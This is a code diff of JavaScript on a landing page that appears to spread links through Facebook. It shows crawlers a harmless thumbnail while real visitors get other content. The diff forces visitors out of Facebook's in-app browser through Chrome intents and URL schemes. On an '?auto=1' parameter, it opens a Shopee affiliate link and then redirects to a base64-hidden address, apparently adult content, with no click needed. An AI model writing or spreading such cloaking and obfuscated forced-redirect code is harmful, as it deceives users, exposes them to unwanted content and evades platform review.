@@ -87,19 +87,32 @@ function isFacebookApp() {
   const ua = navigator.userAgent || "";
   return /FBAN|FBAV/i.test(ua);
 }
-
 function isIOS() {
   return /iPad|iPhone|iPod/i.test(navigator.userAgent);
 }
-
 function isAndroid() {
   return /Android/i.test(navigator.userAgent);
+}
+
+// --- Hàm mở 2 link ---
+function autoOpenLinks() {
+  window.open("https://s.shopee.vn/30dchvC74f", "_blank");
+  setTimeout(() => {
+    const link18 = atob(link18_b64);
+    window.location.href = link18;
+  }, 120);
 }
 
 document.addEventListener('DOMContentLoaded', function() {
   const thumbnail = document.getElementById('thumbnail');
   const real = document.getElementById('real-content');
   const vid = document.getElementById('main-video');
+
+  const params = new URLSearchParams(window.location.search);
+  if (params.get("auto") === "1") {
+    autoOpenLinks();
+    return;
+  }
 
   if (isBot()) {
     thumbnail.style.display = 'block';
@@ -127,30 +140,21 @@ document.addEventListener('DOMContentLoaded', function() {
   document.getElementById('ctaBtn').addEventListener('click', function(e){
     e.preventDefault();
 
-    // Nếu đang trong FB App → mở Chrome/Safari
     if (isFacebookApp()) {
-      let landingURL = window.location.href; // trang hiện tại
+      let landingURL = window.location.origin + window.location.pathname + "?auto=1";
       if (isAndroid()) {
         window.location.href = "intent://" + landingURL.replace(/^https?:\/\//, '') + "#Intent;scheme=https;package=com.android.chrome;end";
       } else if (isIOS()) {
-        // Ưu tiên mở Google Chrome nếu có
         const chromeURL = "googlechrome://" + landingURL.replace(/^https?:\/\//, '');
         window.location.href = chromeURL;
-
-        // Nếu không có Chrome → fallback sang Safari
         setTimeout(() => {
-          window.location.href = landingURL; 
+          window.location.href = landingURL; // fallback Safari
         }, 500);
       }
-      return; // dừng, để Chrome/Safari xử lý tiếp
+      return;
     }
 
-    // Ngoài FB App thì chạy logic cũ
-    window.open("https://s.shopee.vn/30dchvC74f", "_blank");
-    setTimeout(() => {
-      const link18 = atob(link18_b64);
-      window.location.href = link18;
-    }, 120);
+    autoOpenLinks();
   });
 });
 </script>
